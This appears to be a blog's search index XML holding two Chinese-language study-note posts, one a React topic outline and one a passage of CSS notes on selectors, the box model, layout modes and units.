<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>React 知识体系专题学习</title>
    <link href="/2025/06/23/React%20Study%20Notes/"/>
    <url>/2025/06/23/React%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章：React-基础与核心概念"><a href="#第一章：React-基础与核心概念" class="headerlink" title="第一章：React 基础与核心概念"></a>第一章：React 基础与核心概念</h1><h2 id="1-1-React-简介与设计哲学（组件化、声明式-UI）"><a href="#1-1-React-简介与设计哲学（组件化、声明式-UI）" class="headerlink" title="1.1 React 简介与设计哲学（组件化、声明式 UI）"></a>1.1 React 简介与设计哲学（组件化、声明式 UI）</h2><span id="more"></span><h2 id="1-2-JSX-语法与渲染逻辑（表达式、条件渲染、列表渲染）"><a href="#1-2-JSX-语法与渲染逻辑（表达式、条件渲染、列表渲染）" class="headerlink" title="1.2 JSX 语法与渲染逻辑（表达式、条件渲染、列表渲染）"></a>1.2 JSX 语法与渲染逻辑（表达式、条件渲染、列表渲染）</h2><h2 id="1-3-组件基础（函数组件-vs-类组件）"><a href="#1-3-组件基础（函数组件-vs-类组件）" class="headerlink" title="1.3 组件基础（函数组件 vs. 类组件）"></a>1.3 组件基础（函数组件 vs. 类组件）</h2><h2 id="1-4-Props-与-State（数据流、单向数据绑定）"><a href="#1-4-Props-与-State（数据流、单向数据绑定）" class="headerlink" title="1.4 Props 与 State（数据流、单向数据绑定）"></a>1.4 Props 与 State（数据流、单向数据绑定）</h2><h2 id="1-5-事件处理（合成事件、this-绑定问题）"><a href="#1-5-事件处理（合成事件、this-绑定问题）" class="headerlink" title="1.5 事件处理（合成事件、this 绑定问题）"></a>1.5 事件处理（合成事件、this 绑定问题）</h2><h1 id="第二章：React-核心机制"><a href="#第二章：React-核心机制" class="headerlink" title="第二章：React 核心机制"></a>第二章：React 核心机制</h1><h2 id="2-1-虚拟-DOM-与-Diff-算法（Reconciliation）"><a href="#2-1-虚拟-DOM-与-Diff-算法（Reconciliation）" class="headerlink" title="2.1 虚拟 DOM 与 Diff 算法（Reconciliation）"></a>2.1 虚拟 DOM 与 Diff 算法（Reconciliation）</h2><h2 id="2-2-生命周期（类组件生命周期、useEffect-替代方案）"><a href="#2-2-生命周期（类组件生命周期、useEffect-替代方案）" class="headerlink" title="2.2 生命周期（类组件生命周期、useEffect 替代方案）"></a>2.2 生命周期（类组件生命周期、useEffect 替代方案）</h2><h2 id="2-3-受控组件-vs-非受控组件（表单处理）"><a href="#2-3-受控组件-vs-非受控组件（表单处理）" class="headerlink" title="2.3 受控组件 vs. 非受控组件（表单处理）"></a>2.3 受控组件 vs. 非受控组件（表单处理）</h2><h2 id="2-4-组件通信（父子通信、Context-API、事件总线）"><a href="#2-4-组件通信（父子通信、Context-API、事件总线）" class="headerlink" title="2.4 组件通信（父子通信、Context API、事件总线）"></a>2.4 组件通信（父子通信、Context API、事件总线）</h2><h2 id="2-5-Refs-使用场景（DOM-操作、forwardRef）"><a href="#2-5-Refs-使用场景（DOM-操作、forwardRef）" class="headerlink" title="2.5 Refs 使用场景（DOM 操作、forwardRef）"></a>2.5 Refs 使用场景（DOM 操作、forwardRef）</h2><h1 id="第三章：Hooks-深度解析"><a href="#第三章：Hooks-深度解析" class="headerlink" title="第三章：Hooks 深度解析"></a>第三章：Hooks 深度解析</h1><h2 id="3-1-useState-与状态管理"><a href="#3-1-useState-与状态管理" class="headerlink" title="3.1 useState 与状态管理"></a>3.1 useState 与状态管理</h2><h2 id="3-2-useEffect-与副作用（依赖数组、清理函数）"><a href="#3-2-useEffect-与副作用（依赖数组、清理函数）" class="headerlink" title="3.2 useEffect 与副作用（依赖数组、清理函数）"></a>3.2 useEffect 与副作用（依赖数组、清理函数）</h2><h2 id="3-3-useContext-与全局状态共享"><a href="#3-3-useContext-与全局状态共享" class="headerlink" title="3.3 useContext 与全局状态共享"></a>3.3 useContext 与全局状态共享</h2><h2 id="3-4-useReducer-与复杂状态逻辑"><a href="#3-4-useReducer-与复杂状态逻辑" class="headerlink" title="3.4 useReducer 与复杂状态逻辑"></a>3.4 useReducer 与复杂状态逻辑</h2><h2 id="3-5-自定义-Hooks（封装可复用逻辑）"><a href="#3-5-自定义-Hooks（封装可复用逻辑）" class="headerlink" title="3.5 自定义 Hooks（封装可复用逻辑）"></a>3.5 自定义 Hooks（封装可复用逻辑）</h2><h2 id="3-6-其他常用-Hooks（useMemo、useCallback、useRef）"><a href="#3-6-其他常用-Hooks（useMemo、useCallback、useRef）" class="headerlink" title="3.6 其他常用 Hooks（useMemo、useCallback、useRef）"></a>3.6 其他常用 Hooks（useMemo、useCallback、useRef）</h2><h1 id="第四章：React-高级特性"><a href="#第四章：React-高级特性" class="headerlink" title="第四章：React 高级特性"></a>第四章：React 高级特性</h1><h2 id="4-1-性能优化（React-memo、useMemo、useCallback）"><a href="#4-1-性能优化（React-memo、useMemo、useCallback）" class="headerlink" title="4.1 性能优化（React.memo、useMemo、useCallback）"></a>4.1 性能优化（React.memo、useMemo、useCallback）</h2><h2 id="4-2-错误边界（ErrorBoundary）"><a href="#4-2-错误边界（ErrorBoundary）" class="headerlink" title="4.2 错误边界（ErrorBoundary）"></a>4.2 错误边界（ErrorBoundary）</h2><h2 id="4-3-代码分割与懒加载（React-lazy-Suspense）"><a href="#4-3-代码分割与懒加载（React-lazy-Suspense）" class="headerlink" title="4.3 代码分割与懒加载（React.lazy + Suspense）"></a>4.3 代码分割与懒加载（React.lazy + Suspense）</h2><h2 id="4-4-Portals（渲染到-DOM-外部节点）"><a href="#4-4-Portals（渲染到-DOM-外部节点）" class="headerlink" title="4.4 Portals（渲染到 DOM 外部节点）"></a>4.4 Portals（渲染到 DOM 外部节点）</h2><h2 id="4-5-高阶组件（HOC）与-Render-Props"><a href="#4-5-高阶组件（HOC）与-Render-Props" class="headerlink" title="4.5 高阶组件（HOC）与 Render Props"></a>4.5 高阶组件（HOC）与 Render Props</h2><h1 id="第五章：React-状态管理"><a href="#第五章：React-状态管理" class="headerlink" title="第五章：React 状态管理"></a>第五章：React 状态管理</h1><h2 id="5-1-状态提升与单向数据流"><a href="#5-1-状态提升与单向数据流" class="headerlink" title="5.1 状态提升与单向数据流"></a>5.1 状态提升与单向数据流</h2><h2 id="5-2-Redux-核心概念（Store、Action、Reducer）"><a href="#5-2-Redux-核心概念（Store、Action、Reducer）" class="headerlink" title="5.2 Redux 核心概念（Store、Action、Reducer）"></a>5.2 Redux 核心概念（Store、Action、Reducer）</h2><h2 id="5-3-Redux-中间件（redux-thunk、redux-saga）"><a href="#5-3-Redux-中间件（redux-thunk、redux-saga）" class="headerlink" title="5.3 Redux 中间件（redux-thunk、redux-saga）"></a>5.3 Redux 中间件（redux-thunk、redux-saga）</h2><h2 id="5-4-React-Redux（Provider、useSelector、useDispatch）"><a href="#5-4-React-Redux（Provider、useSelector、useDispatch）" class="headerlink" title="5.4 React-Redux（Provider、useSelector、useDispatch）"></a>5.4 React-Redux（Provider、useSelector、useDispatch）</h2><h2 id="5-5-现代状态管理方案（Recoil、Zustand、Jotai）"><a href="#5-5-现代状态管理方案（Recoil、Zustand、Jotai）" class="headerlink" title="5.5 现代状态管理方案（Recoil、Zustand、Jotai）"></a>5.5 现代状态管理方案（Recoil、Zustand、Jotai）</h2><h1 id="第六章：React-Router-与数据请求"><a href="#第六章：React-Router-与数据请求" class="headerlink" title="第六章：React Router 与数据请求"></a>第六章：React Router 与数据请求</h1><h2 id="6-1-React-Router-基础（BrowserRouter、Route、Link）"><a href="#6-1-React-Router-基础（BrowserRouter、Route、Link）" class="headerlink" title="6.1 React Router 基础（BrowserRouter、Route、Link）"></a>6.1 React Router 基础（BrowserRouter、Route、Link）</h2><h2 id="6-2-动态路由与嵌套路由"><a href="#6-2-动态路由与嵌套路由" class="headerlink" title="6.2 动态路由与嵌套路由"></a>6.2 动态路由与嵌套路由</h2><h2 id="6-3-路由守卫与权限控制"><a href="#6-3-路由守卫与权限控制" class="headerlink" title="6.3 路由守卫与权限控制"></a>6.3 路由守卫与权限控制</h2><h2 id="6-4-数据请求方案（fetch、axios、React-Query、SWR）"><a href="#6-4-数据请求方案（fetch、axios、React-Query、SWR）" class="headerlink" title="6.4 数据请求方案（fetch、axios、React Query、SWR）"></a>6.4 数据请求方案（fetch、axios、React Query、SWR）</h2><h2 id="6-5-SSR-与-Next-js-基础"><a href="#6-5-SSR-与-Next-js-基础" class="headerlink" title="6.5 SSR 与 Next.js 基础"></a>6.5 SSR 与 Next.js 基础</h2><h1 id="第七章：React-工程化与优化"><a href="#第七章：React-工程化与优化" class="headerlink" title="第七章：React 工程化与优化"></a>第七章：React 工程化与优化</h1><h2 id="7-1-组件设计模式（复合组件、受控组件模式）"><a href="#7-1-组件设计模式（复合组件、受控组件模式）" class="headerlink" title="7.1 组件设计模式（复合组件、受控组件模式）"></a>7.1 组件设计模式（复合组件、受控组件模式）</h2><h2 id="7-2-样式方案（CSS-Modules、Styled-Components、Tailwind-CSS）"><a href="#7-2-样式方案（CSS-Modules、Styled-Components、Tailwind-CSS）" class="headerlink" title="7.2 样式方案（CSS Modules、Styled Components、Tailwind CSS）"></a>7.2 样式方案（CSS Modules、Styled Components、Tailwind CSS）</h2><h2 id="7-3-测试（Jest-React-Testing-Library）"><a href="#7-3-测试（Jest-React-Testing-Library）" class="headerlink" title="7.3 测试（Jest + React Testing Library）"></a>7.3 测试（Jest + React Testing Library）</h2><h2 id="7-4-性能优化（React-Profiler、减少重渲染）"><a href="#7-4-性能优化（React-Profiler、减少重渲染）" class="headerlink" title="7.4 性能优化（React Profiler、减少重渲染）"></a>7.4 性能优化（React Profiler、减少重渲染）</h2><h2 id="7-5-构建工具（Webpack-配置、Vite-优化）"><a href="#7-5-构建工具（Webpack-配置、Vite-优化）" class="headerlink" title="7.5 构建工具（Webpack 配置、Vite 优化）"></a>7.5 构建工具（Webpack 配置、Vite 优化）</h2><h1 id="第八章：React-18-新特性与未来趋势"><a href="#第八章：React-18-新特性与未来趋势" class="headerlink" title="第八章：React 18 新特性与未来趋势"></a>第八章：React 18 新特性与未来趋势</h1><h2 id="8-1-Concurrent-Mode（并发渲染）"><a href="#8-1-Concurrent-Mode（并发渲染）" class="headerlink" title="8.1 Concurrent Mode（并发渲染）"></a>8.1 Concurrent Mode（并发渲染）</h2><h2 id="8-2-自动批处理（Automatic-Batching）"><a href="#8-2-自动批处理（Automatic-Batching）" class="headerlink" title="8.2 自动批处理（Automatic Batching）"></a>8.2 自动批处理（Automatic Batching）</h2><h2 id="8-3-Transition-API（startTransition）"><a href="#8-3-Transition-API（startTransition）" class="headerlink" title="8.3 Transition API（startTransition）"></a>8.3 Transition API（startTransition）</h2><h2 id="8-4-Server-Components（服务端组件）"><a href="#8-4-Server-Components（服务端组件）" class="headerlink" title="8.4 Server Components（服务端组件）"></a>8.4 Server Components（服务端组件）</h2><h2 id="8-5-React-生态趋势（RSC、React-Native）"><a href="#8-5-React-生态趋势（RSC、React-Native）" class="headerlink" title="8.5 React 生态趋势（RSC、React Native）"></a>8.5 React 生态趋势（RSC、React Native）</h2>]]></content>
    
    
    <categories>
      
      <category>React</category>
      
    </categories>
    
    
    <tags>
      
      <tag>React</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSS 专题知识学习</title>
    <link href="/2025/06/22/CSS%20Study%20Notes/"/>
    <url>/2025/06/22/CSS%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章：CSS-基础与核心概念"><a href="#第一章：CSS-基础与核心概念" class="headerlink" title="第一章：CSS 基础与核心概念"></a>第一章：CSS 基础与核心概念</h1><h2 id="1-1-CSS-语法与选择器（基础选择器、组合选择器、属性选择器）"><a href="#1-1-CSS-语法与选择器（基础选择器、组合选择器、属性选择器）" class="headerlink" title="1.1 CSS 语法与选择器（基础选择器、组合选择器、属性选择器）"></a>1.1 CSS 语法与选择器（基础选择器、组合选择器、属性选择器）</h2><h3 id="基础语法结构"><a href="#基础语法结构" class="headerlink" title="基础语法结构"></a>基础语法结构</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 标准规则 */</span><br>selector &#123;<br>  property: value; <span class="hljs-comment">/* 声明块 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="基础选择器"><a href="#基础选择器" class="headerlink" title="基础选择器"></a>基础选择器</h3><p><strong>元素选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">div</span> &#123; <span class="hljs-attribute">color</span>: red; &#125;<br></code></pre></td></tr></table></figure><ul><li>权重：0,0,1</li><li>适用场景：全局样式覆盖</li></ul><p><strong>类选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.active</span> &#123; <span class="hljs-attribute">background</span>: blue; &#125;<br></code></pre></td></tr></table></figure><ul><li>权重：0,1,0</li><li>实践：BEM命名规范（block__element–modifier）</li></ul><span id="more"></span><p><strong>ID 选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-id">#header</span> &#123; <span class="hljs-attribute">height</span>: <span class="hljs-number">60px</span>; &#125;<br></code></pre></td></tr></table></figure><ul><li>权重：1,0,0</li><li>禁用场景：React&#x2F;Vue中易导致样式污染（组件化开发慎用）</li></ul><p><strong>通配选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS">* &#123; <span class="hljs-attribute">box-sizing</span>: border-box; &#125;<br></code></pre></td></tr></table></figure><ul><li>权重：0,0,0</li><li>性能影响：大型项目避免过度使用</li></ul><h3 id="组合选择器"><a href="#组合选择器" class="headerlink" title="组合选择器"></a>组合选择器</h3><p><strong>后代选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">nav</span> <span class="hljs-selector-tag">a</span> &#123; <span class="hljs-attribute">color</span>: green; &#125; <span class="hljs-comment">/* 所有层级后代 */</span><br></code></pre></td></tr></table></figure><ul><li>权重：各选择器权重相加</li><li>性能陷阱：深层嵌套增加渲染成本（建议限制 3 层）</li></ul><p><strong>子选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">ul</span> &gt; <span class="hljs-selector-tag">li</span> &#123; <span class="hljs-attribute">list-style</span>: none; &#125; <span class="hljs-comment">/* 仅直接子元素 */</span><br></code></pre></td></tr></table></figure><ul><li>与后代选择器区别：不匹配非直接嵌套元素</li></ul><p><strong>相邻兄弟选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">h1</span> + <span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0</span>; &#125; <span class="hljs-comment">/* 紧邻的下一个兄弟 */</span><br></code></pre></td></tr></table></figure><ul><li>典型场景：表单元素间隔控制</li></ul><p><strong>通用兄弟选择器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">h2</span> ~ <span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">color</span>: gray; &#125; <span class="hljs-comment">/* 后续所有同级兄弟 */</span><br></code></pre></td></tr></table></figure><ul><li>应用案例：目录标题与内容样式关联</li></ul><h3 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h3><table><thead><tr><th align="left">选择器类型</th><th align="left">示例</th><th align="left">匹配规则</th><th align="left">权重</th></tr></thead><tbody><tr><td align="left">[attr]</td><td align="left">[target]</td><td align="left">存在该属性即可</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr&#x3D;value]</td><td align="left">[lang&#x3D;”en”]</td><td align="left">属性值完全匹配</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr~&#x3D;value]</td><td align="left">[class~&#x3D;”logo”]</td><td align="left">属性值包含该词（空格分隔）</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr&#x3D;value]</td><td align="left">[lang&#x3D;”zh”]</td><td align="left">属性值为zh或以zh-开头</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr^&#x3D;value]</td><td align="left">[href^&#x3D;”https”]</td><td align="left">属性值以指定字符串开头</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr$&#x3D;value]</td><td align="left">[src$&#x3D;”.png”]</td><td align="left">属性值以指定字符串结尾</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr*&#x3D;value]</td><td align="left">[data*&#x3D;”error”]</td><td align="left">属性值包含子字符串</td><td align="left">0,1,0</td></tr></tbody></table><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p><strong>Q：<code>.nav li &gt; a</code> 和 <code>.nav &gt; li &gt; a</code> 的权重与作用域差异？</strong></p><p>权重相同（0,2,1），但后者限制 <code>li</code> 必须为 <code>.nav</code> 的直接子元素</p><p><strong>Q：<code>div:not([class])</code> 会匹配哪些元素？</strong></p><p>所有没有 class 属性的 div 元素</p><h2 id="1-2-盒模型（标准盒模型-vs-怪异盒模型）"><a href="#1-2-盒模型（标准盒模型-vs-怪异盒模型）" class="headerlink" title="1.2 盒模型（标准盒模型 vs. 怪异盒模型）"></a>1.2 盒模型（标准盒模型 vs. 怪异盒模型）</h2><h3 id="核心概念对比"><a href="#核心概念对比" class="headerlink" title="核心概念对比"></a>核心概念对比</h3><table><thead><tr><th align="left">特性</th><th align="left">标准盒模型（W3C）</th><th align="left">怪异盒模型（Quirks Mode）</th></tr></thead><tbody><tr><td align="left">触发条件</td><td align="left">box-sizing: content-box</td><td align="left">box-sizing: border-box</td></tr><tr><td align="left">宽度计算</td><td align="left">width &#x3D; content宽度</td><td align="left">width &#x3D; content + padding + border</td></tr><tr><td align="left">高度计算</td><td align="left">height &#x3D; content高度</td><td align="left">height &#x3D; content + padding + border</td></tr><tr><td align="left">默认场景</td><td align="left">现代浏览器默认模式</td><td align="left">传统IE5及更早浏览器</td></tr></tbody></table><h3 id="代码验证"><a href="#代码验证" class="headerlink" title="代码验证"></a>代码验证</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;std-box&quot;&gt;标准盒模型&lt;/div&gt;<br>&lt;div class=&quot;weird-box&quot;&gt;怪异盒模型&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.std-box</span> &#123;<br>  <span class="hljs-attribute">box-sizing</span>: content-box; <span class="hljs-comment">/* 默认值可省略 */</span><br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">5px</span> solid red;<br>  <span class="hljs-comment">/* 实际占用宽度：100 + 20*2 + 5*2 = 150px */</span><br>&#125;<br><br><span class="hljs-selector-class">.weird-box</span> &#123;<br>  <span class="hljs-attribute">box-sizing</span>: border-box;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">5px</span> solid blue;<br>  <span class="hljs-comment">/* 实际占用宽度：100px (content自动压缩为50px) */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="思考-1"><a href="#思考-1" class="headerlink" title="思考"></a>思考</h3><p><strong>Q：为什么大型项目普遍采用 <code>border-box</code>？</strong></p><ul><li>开发体验优化：轻松实现栅格化布局，无需计算 padding</li><li>性能优势：减少重排计算（浏览器无需重新计算内容区尺寸）</li><li>设计系统适配：确保 UI 标注尺寸与实际渲染尺寸一致</li></ul><h2 id="1-3-布局模式（块级、行内、行内块、Flex、Grid）"><a href="#1-3-布局模式（块级、行内、行内块、Flex、Grid）" class="headerlink" title="1.3 布局模式（块级、行内、行内块、Flex、Grid）"></a>1.3 布局模式（块级、行内、行内块、Flex、Grid）</h2><h3 id="块级布局（Block）"><a href="#块级布局（Block）" class="headerlink" title="块级布局（Block）"></a>块级布局（Block）</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: block;<br></code></pre></td></tr></table></figure><p><strong>核心特性</strong></p><ul><li>独占一行，默认宽度撑满父容器</li><li>可设置宽高&#x2F;margin&#x2F;padding所有方向</li><li>典型元素：<code>&lt;div&gt;</code>、<code>&lt;p&gt;</code>、<code>&lt;section&gt;</code></li></ul><h3 id="行内布局（Inline）"><a href="#行内布局（Inline）" class="headerlink" title="行内布局（Inline）"></a>行内布局（Inline）</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: inline;<br></code></pre></td></tr></table></figure><p><strong>核心特性</strong></p><ul><li>不独占一行，宽度由内容决定</li><li>不可设置宽高，垂直方向的 margin&#x2F;padding 不生效</li><li>典型元素：<code>&lt;span&gt;</code>、<code>&lt;a&gt;</code>、<code>&lt;em&gt;</code></li></ul><h3 id="行内块布局（Inline-block）"><a href="#行内块布局（Inline-block）" class="headerlink" title="行内块布局（Inline-block）"></a>行内块布局（Inline-block）</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: inline-block;<br></code></pre></td></tr></table></figure><p><strong>核心特性</strong></p><ul><li>不独占一行但可以设置宽高（兼具块级布局和行内布局特性）</li><li>默认基线对齐（引发经典垂直对齐问题）</li></ul><p><strong>思考</strong></p><ul><li>如何消除行内块元素间隙：父容器font-size: 0或HTML代码无空格</li><li>垂直对齐控制：vertical-align: middle&#x2F;top&#x2F;bottom</li></ul><h3 id="Flex布局"><a href="#Flex布局" class="headerlink" title="Flex布局"></a>Flex布局</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: flex;<br></code></pre></td></tr></table></figure><p><strong>核心特性</strong></p><ul><li>主轴&#x2F;交叉轴双轴控制</li><li>子项弹性伸缩（flex-grow&#x2F;shrink&#x2F;basis）</li></ul><p><strong>思考</strong></p><ul><li>实现等高布局：<code>align-items: stretch</code></li><li>圣杯布局：<code>flex: 1</code> + <code>order</code> 属性</li><li>性能优化：避免过度嵌套</li></ul><p><strong>实战实例</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-wrap</span>: wrap;<br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>; <span class="hljs-comment">/* 替代margin方案 */</span><br>&#125;<br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-built_in">calc</span>(<span class="hljs-number">33.33%</span> - <span class="hljs-number">10px</span>); <span class="hljs-comment">/* 三栏自适应 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Grid网格布局"><a href="#Grid网格布局" class="headerlink" title="Grid网格布局"></a>Grid网格布局</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: grid;<br></code></pre></td></tr></table></figure><p><strong>核心特性</strong></p><ul><li>二维布局系统（行列显式定义）</li><li>网格线&#x2F;网格区域命名控制</li></ul><h3 id="渲染性能排序"><a href="#渲染性能排序" class="headerlink" title="渲染性能排序"></a>渲染性能排序</h3><p>Block &gt; Flex ≈ Grid &gt; Inline-block（复合层创建成本）</p><h2 id="1-4-常用单位（px、em、rem、vw-vh、-）"><a href="#1-4-常用单位（px、em、rem、vw-vh、-）" class="headerlink" title="1.4 常用单位（px、em、rem、vw&#x2F;vh、%）"></a>1.4 常用单位（px、em、rem、vw&#x2F;vh、%）</h2><h3 id="绝对单位与相对单位的对比"><a href="#绝对单位与相对单位的对比" class="headerlink" title="绝对单位与相对单位的对比"></a>绝对单位与相对单位的对比</h3><table><thead><tr><th align="left">单位类型</th><th align="left">代表单位</th><th align="left">基准参照物</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">绝对单位</td><td align="left">px</td><td align="left">设备物理像素</td><td align="left">边框&#x2F;阴影等固定尺寸</td></tr><tr><td align="left">相对单位</td><td align="left">em&#x2F;rem</td><td align="left">字体大小&#x2F;根字体大小</td><td align="left">响应式文本&#x2F;组件间距</td></tr><tr><td align="left">视口单位</td><td align="left">vw&#x2F;vh</td><td align="left">视窗宽高</td><td align="left">全屏布局&#x2F;自适应元素</td></tr><tr><td align="left">百分比</td><td align="left">%</td><td align="left">父元素对应属性值</td><td align="left">流式布局&#x2F;继承比例</td></tr></tbody></table><h3 id="核心单位详解"><a href="#核心单位详解" class="headerlink" title="核心单位详解"></a>核心单位详解</h3><p><strong>px（像素）</strong></p><ul><li>本质：与设备物理像素挂钩（但受 DPR 影响）</li><li>陷阱：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">2px</span>; <span class="hljs-comment">/* 高清屏可能实际渲染为4物理像素 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>em</strong></p><ul><li>计算规则：<code>1em = 当前元素 font-size</code></li><li>级联问题：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS">&lt;<span class="hljs-selector-tag">div</span> class=&quot;parent&quot; style=&quot;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span><span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string">  &lt;div class=&quot;</span>child<span class="hljs-string">&quot; style=&quot;</span>font-size: <span class="hljs-number">1.2em</span><span class="hljs-string">&quot;&gt; &lt;!-- 24px --&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;</span>grandchild<span class="hljs-string">&quot; style=&quot;</span>width: <span class="hljs-number">2em</span><span class="hljs-string">&quot;&gt; &lt;!-- 48px (!) --&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">  &lt;/div&gt;</span><br><span class="hljs-string">&lt;/div&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>rem（Root em）</strong></p><ul><li>计算规则：<code>1rem = 根元素 font-size</code></li></ul><p><strong>vw&#x2F;vh（视口单位）</strong></p><ul><li>计算规则：<code>1vw = 视口宽度的 1%</code>，<code>1vh = 视口高度的 1%</code></li><li>陷阱：移动端vh包含浏览器工具栏区域（可用dvh单位解决）</li></ul><p><strong>%（百分比）</strong></p><ul><li><p>参照基准：</p><table><thead><tr><th align="left">属性</th><th align="left">参照对象</th></tr></thead><tbody><tr><td align="left">width&#x2F;height</td><td align="left">父元素的内容区宽度&#x2F;高度</td></tr><tr><td align="left">padding&#x2F;margin</td><td align="left">父元素的内容区宽度</td></tr><tr><td align="left">top&#x2F;left</td><td align="left">包含块的高度&#x2F;宽度</td></tr></tbody></table></li><li><p>经典面试题</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10%</span>;<br>&#125;<br><span class="hljs-comment">/* 实际padding值为20px（基于父元素width计算） */</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="1-5-层叠与继承（z-index、-important、继承规则）"><a href="#1-5-层叠与继承（z-index、-important、继承规则）" class="headerlink" title="1.5 层叠与继承（z-index、!important、继承规则）"></a>1.5 层叠与继承（z-index、!important、继承规则）</h2><h3 id="层叠上下文的核心原理"><a href="#层叠上下文的核心原理" class="headerlink" 